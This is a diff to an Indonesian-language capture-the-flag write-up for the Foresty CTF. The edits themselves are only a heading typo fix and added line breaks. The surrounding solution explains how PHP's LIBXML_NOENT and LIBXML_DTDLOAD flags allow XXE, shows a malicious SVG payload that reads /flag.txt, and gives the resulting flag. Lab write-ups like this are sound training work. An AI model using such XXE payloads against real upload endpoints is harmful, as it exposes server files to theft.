@@ -127,7 +127,7 @@ Berikut adalah penyelesaian untuk tantangan dari CTF Foresty.
 ---
 ---
 
-## 🚩 ScureForce - Naufal Adli
+## 🚩 SecureForce - Naufal Adli
 
 Berikut adalah penyelesaian untuk tantangan dari CTF Foresty.
 
@@ -190,6 +190,7 @@ Berikut adalah penyelesaian untuk tantangan dari CTF Foresty.
     Ditemukan `$dom->load($path, LIBXML_NOENT | LIBXML_DTDLOAD);` Itu artinya kita bisa melakukan serangan XXE!
     <br>
   - Buat file SVG berbahaya yang berisi *payload* XXE untuk membaca file lokal (`/flag.txt`).
+   <br>
      ```xml
      <?xml version="1.0"?>
      <!DOCTYPE svg [
@@ -199,6 +200,7 @@ Berikut adalah penyelesaian untuk tantangan dari CTF Foresty.
        <title>&flag;</title>
      </svg>
      ```
+      <br>
   - Unggah file SVG tersebut, dan flag akan muncul di judul gambar.
   <img src="img/svg5.png" width="500">
 - **Flag:** `foresty{670ef0276339a9989da10a47d46a6115}`
